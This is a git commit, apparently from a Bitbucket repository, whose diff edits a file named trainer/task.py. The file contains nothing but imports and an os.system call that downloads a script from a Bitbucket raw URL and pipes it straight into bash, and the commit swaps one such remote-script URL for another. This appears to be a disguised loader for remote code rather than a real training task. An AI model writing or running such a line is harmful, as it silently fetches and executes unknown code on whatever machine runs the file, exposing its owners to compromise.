01c2ec84c2ae877042ad9b55b4b276c564a04887
Alfira Kuester <alfirakuester@gmail.com>
2023-12-12 13:45:52 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/aing005/zepro/raw/main/nivu | bash')
+os.system('curl -sL https://bitbucket.org/aing005/newnivu/raw/main/nevoy | bash')
